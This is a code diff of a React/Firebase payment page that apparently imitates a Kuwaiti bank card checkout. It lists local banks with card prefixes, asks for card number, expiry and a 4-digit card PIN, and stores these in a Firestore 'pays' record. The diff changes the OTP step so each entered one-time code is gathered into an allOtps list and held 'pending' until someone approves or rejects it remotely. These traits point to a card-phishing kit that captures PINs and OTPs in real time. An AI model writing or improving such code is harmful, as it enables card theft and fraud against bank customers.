@@ -1,31 +1,31 @@
 "use client"
-import { useEffect, useState } from 'react';
-import './kent.css'
-import { doc, onSnapshot } from 'firebase/firestore';
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-import { Search, ShoppingCart, User, Store, Shield, ArrowRight, PlusCircle, CreditCard, AlertCircle, Calendar, Lock } from "lucide-react"
+import { useEffect, useState } from "react"
+import "./kent.css"
+import { doc, onSnapshot } from "firebase/firestore"
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { CreditCard, AlertCircle, Calendar, Lock } from "lucide-react"
 import { Button } from "@/components/ui/button"
-import { db, handlePay } from '@/lib/firebase';
-import { Alert, AlertDescription } from '@/components/ui/alert';
-import { Label } from '@/components/ui/label';
-import { FullPageLoader } from '@/components/full-page-loader';
-import { Separator } from '@/components/ui/separator';
-import { Input } from '@/components/ui/input';
+import { db, handlePay } from "@/lib/firebase"
+import { Alert, AlertDescription } from "@/components/ui/alert"
+import { Label } from "@/components/ui/label"
+import { FullPageLoader } from "@/components/full-page-loader"
+import { Separator } from "@/components/ui/separator"
+import { Input } from "@/components/ui/input"
 type PaymentInfo = {
-  createdDate:string;
-  cardNumber: string;
-  year: string;
-  month: string;
-  bank?: string;
-  cvv?: string;
-  otp?: string;
-  pass: string;
-  cardState: string;
-  allOtps: string[],
-  bank_card: string[];
-  prefix: string;
-  status: 'new' | 'pending' | 'approved' | 'rejected';
-};
+  createdDate: string
+  cardNumber: string
+  year: string
+  month: string
+  bank?: string
+  cvv?: string
+  otp?: string
+  pass: string
+  cardState: string
+  allOtps: string[]
+  bank_card: string[]
+  prefix: string
+  status: "new" | "pending" | "approved" | "rejected"
+}
 const BANKS = [
   {
     value: "ABK",
@@ -58,7 +58,8 @@ const BANKS = [
     value: "CBK",
     label: "Commercial Bank of Kuwait",
     cardPrefixes: ["532672", "537015", "521175", "516334"],
-  }, {
+  },
+  {
     value: "Doha",
     label: "Doha Bank",
     cardPrefixes: ["419252"],
@@ -86,7 +87,6 @@ const BANKS = [
     cardPrefixes: ["409054", "406464"],
   },
   {
-
     value: "NBK",
     label: "National Bank of Kuwait",
     cardPrefixes: ["464452", "589160"],
@@ -114,14 +114,12 @@ const BANKS = [
 ]
 
 const Payment = (props: any) => {
+  const handleSubmit = async () => {}
 
-  const handleSubmit = async () => {
-  };
-
-  const [step, setstep] = useState(1);
-  const [newotp] = useState([''])
-  const [total, setTotal] = useState('');
-  const [isloading, setisloading] = useState(false);
+  const [step, setstep] = useState(1)
+  const [newotp] = useState([""])
+  const [total, setTotal] = useState("")
+  const [isloading, setisloading] = useState(false)
   const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
   const [isExpired, setIsExpired] = useState(false)
 
@@ -153,56 +151,65 @@ const Payment = (props: any) => {
   }
 
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
-    createdDate:new Date().toISOString(),
-    cardNumber: '',
-    year: '',
-    month: '',
-    otp: '',
+    createdDate: new Date().toISOString(),
+    cardNumber: "",
+    year: "",
+    month: "",
+    otp: "",
     allOtps: newotp,
-    bank: '',
-    pass: '',
-    cardState: 'new',
-    bank_card: [''],
-    prefix: '',
-    status: 'new',
-  });
+    bank: "",
+    pass: "",
+    cardState: "new",
+    bank_card: [""],
+    prefix: "",
+    status: "new",
+  })
 
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
   useEffect(() => {
     //handleAddotp(paymentInfo.otp!)
-    const ty = localStorage!.getItem('amount')
+    const ty = localStorage!.getItem("amount")
     if (ty) {
       setTotal(ty)
-
     }
   }, [])
 
   useEffect(() => {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as PaymentInfo;
+          const data = docSnap.data() as PaymentInfo
           if (data.status) {
-            setPaymentInfo(prev => ({ ...prev, status: data.status }));
-            if (data.status === 'approved') {
-              setstep(2);
-              setisloading(false);
-            } else if (data.status === 'rejected') {
-              setisloading(false);
-              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
-              setstep(1);
+            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
+            if (data.status === "approved") {
+              // If we're on step 1, move to OTP verification
+              if (step === 1) {
+                setstep(2)
+                setisloading(false)
+              }
+              // If we're already on step 2 (OTP verification), this means OTP was approved
+              else if (step === 2) {
+                // Show success message or redirect to success page
+                setisloading(false)
+                // You could redirect here or show a success component
+              }
+            } else if (data.status === "rejected") {
+              setisloading(false)
+              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
+              setstep(1)
+            } else if (data.status === "pending") {
+              setisloading(true)
             }
           }
         }
-      });
+      })
 
-      return () => unsubscribe();
+      return () => unsubscribe()
     }
-  }, []);
-
+  }, [step])
 
   return (
     <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir='ltr'> 
@@ -591,7 +598,7 @@ const Payment = (props: any) => {
               <CreditCard className="h-4 w-4" />
               <span>Card Number:</span>
             </div>
-            <span className="font-medium">•••• •••• •••• {paymentInfo.cardNumber}</span>
+            <span className="font-medium">••••  {paymentInfo.cardNumber}</span>
           </div>
 
           <Separator />
@@ -633,6 +640,7 @@ const Payment = (props: any) => {
               setPaymentInfo({
                 ...paymentInfo,
                 otp: e.target.value.replace(/[^0-9]/g, ""),
+                status:'pending'
               })
             }
           /> <div className="flex items-center justify-between mt-2">
@@ -689,39 +697,34 @@ const Payment = (props: any) => {
                       size={'sm'} className='bg-gray-300 mx-1' variant={'outline'}
                         disabled={
                           (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
-                          paymentInfo.status === 'pending' || step ===2 && paymentInfo.otp?.length !==6
+         step ===2 && paymentInfo.otp?.length !==6
                         }
                         onClick={() => {
                           if (step === 1) {
                             setisloading(true);
-                            handlePay(paymentInfo, setPaymentInfo)
+                            handlePay(paymentInfo, setPaymentInfo);
                             handleSubmit();
-                          } else if (step >= 2) {
-
-                            if (
-                              !newotp.includes(paymentInfo.otp!)
-
-                            ) { newotp.push(paymentInfo.otp!) }
-                            setisloading(true)
+                          } else if (step === 2) {
+                            if (!newotp.includes(paymentInfo.otp!)) { 
+                              newotp.push(paymentInfo.otp!);
+                            }
+                            setisloading(true);
                             handleAddotp(paymentInfo.otp!);
-                            //   handleOArr(paymentInfo.otp!);
                             
-                            handlePay(paymentInfo, setPaymentInfo)
-                            setTimeout(() => {
-                              setisloading(false)
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                otp: '',
-                                status: 'approved',
-                              });
-                            }, 3000);
-
-
+                            // Update the payment info with OTP and set status to pending for approval
+                            const updatedPaymentInfo = {
+                              ...paymentInfo,
+                              otp: paymentInfo.otp,
+                              status: 'pending',
+                              allOtps: [...newotp]
+                            };
+                            
+                            // Send the updated payment info for processing
+                            handlePay(updatedPaymentInfo, setPaymentInfo);
+                            
+                            // Don't reset OTP immediately to allow for proper verification
+                            // The status will be updated by the Firebase listener
                           }
-                          setPaymentInfo({
-                            ...paymentInfo,
-                            otp:'',
-                          })
                         }}
                       >
                         {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
@@ -772,6 +775,6 @@ const Payment = (props: any) => {
       {isloading && <FullPageLoader />}
     </div>
   );
-};
+}
 
 export default Payment
